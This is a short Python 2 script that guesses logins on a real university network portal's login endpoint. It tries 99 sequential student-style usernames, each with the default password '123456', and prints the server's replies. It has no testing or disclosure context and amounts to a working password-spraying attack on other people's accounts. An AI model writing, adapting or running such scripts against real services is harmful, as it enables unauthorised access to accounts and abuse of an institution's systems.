import requests
import sys


param = {'username':'','password':''}
n = 1
tmp_username = ''
tmp_password = '123456'
while n < 100 :
     if n < 10:
        tmp_username = '0' + str(n)
     else:
        tmp_username = str(n)
     n = n + 1
     #print tmp_username
     param['username'] = 'mg15330' + tmp_username
     param['password'] = tmp_password
     #print param['username'],param['password']
     r = requests.post('http://p.nju.edu.cn/portal_io/login',data = param)
#print sys.getefaultencoding()
     print r.text

